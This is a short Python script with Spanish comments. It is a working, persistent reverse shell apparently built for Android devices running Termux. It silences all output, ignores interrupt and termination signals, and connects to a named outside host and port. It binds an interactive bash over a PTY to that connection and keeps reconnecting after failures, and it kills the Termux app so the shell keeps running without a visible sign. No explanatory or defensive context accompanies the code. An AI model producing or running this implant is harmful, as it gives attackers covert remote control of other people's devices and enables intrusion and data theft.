#!/usr/bin/env python3
import socket, subprocess, os, sys, time, signal, pty

# Silenciar todo
sys.stdout = sys.stderr = open('/dev/null', 'w')

HOST = "Astrazam-37147.portmap.host"
PORT = 37147

# Ignorar señales
signal.signal(signal.SIGINT, signal.SIG_IGN)
signal.signal(signal.SIGTERM, signal.SIG_IGN)

# Detectar shell de Termux
SHELL = "/data/data/com.termux/files/usr/bin/bash" if os.path.exists('/data/data/com.termux') else "/bin/bash"

def persistent_shell():
    """Shell persistente con PTY y reconexión"""
    while True:
        try:
            s = socket.socket()
            s.settimeout(30)
            s.connect((HOST, PORT))
            s.settimeout(None)
            
            # Crear PTY interactivo
            pid, fd = pty.fork()
            
            if pid == 0:  # Hijo
                os.dup2(s.fileno(), 0)
                os.dup2(s.fileno(), 1)
                os.dup2(s.fileno(), 2)
                os.execl(SHELL, SHELL, "-i")
            else:  # Padre
                os.dup2(s.fileno(), 0)
                os.dup2(s.fileno(), 1)
                os.dup2(s.fileno(), 2)
                os.waitpid(pid, 0)
                
            s.close()
            
        except Exception:
            time.sleep(3)
            continue

if __name__ == "__main__":
    # Cerrar Termux después de 2 segundos (opcional)
    time.sleep(2)
    try:
        os.system("pkill -f com.termux 2>/dev/null")
    except:
        pass
    
    persistent_shell()
